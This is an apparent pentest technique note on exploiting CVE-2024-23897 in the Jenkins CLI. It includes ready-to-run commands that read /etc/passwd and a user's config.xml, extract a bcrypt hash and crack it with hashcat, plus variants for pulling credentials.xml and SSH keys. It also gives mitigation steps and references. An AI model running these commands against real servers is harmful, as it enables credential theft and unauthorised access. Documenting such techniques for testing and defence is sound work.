---
topic: File read with the Jenkins CLI
tags: [linux, jenkins, cve, file-read, credentials]
---

# File read with the Jenkins CLI

[🌐 Español](jenkins-cli-file-read.md) | **English**

## Concept

The Jenkins CLI treats arguments starting with `@` as file paths and substitutes their contents. In versions affected by CVE-2024-23897, a command expecting text returns the contents of an arbitrary file, exposing configurations and hashes.

## When it applies

- Port `8080` shows Jenkins and the version predates the fix.
- `jnlpJars/jenkins-cli.jar` is downloadable.
- A user account's `config.xml` may contain a hash.

## Procedure

1. Download the CLI and list available commands.
2. Try `@/etc/passwd` in a text argument.
3. Read `/var/jenkins_home/users/<user>_*/config.xml` and extract the bcrypt hash.
4. Crack with `hashcat -m 3200` and access the panel.

```bash
java -jar jenkins-cli.jar -s http://<IP>:8080/ help
java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node @/etc/passwd
java -jar jenkins-cli.jar -s http://<IP>:8080/ connect-node @/var/jenkins_home/users/jennifer_*/config.xml
hashcat -m 3200 hash.txt rockyou.txt
```

## Variants

- Use another command accepting free text if `connect-node` is restricted.
- Read `credentials.xml` or pipeline keys.
- Combine the read with a stored SSH credential.

## Limitations

- The CLI must be enabled and reachable.
- The version must be vulnerable.
- Files must be readable by the Jenkins user.

## Mitigation and detection

- Update Jenkins to a fixed version.
- Disable the remote CLI and restrict `8080`.
- Rotate credentials and review access to `config.xml`.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2024-23897>
- <https://www.jenkins.io/security/advisory/2024-01-24/>
- <https://attack.mitre.org/techniques/T1552/001/>
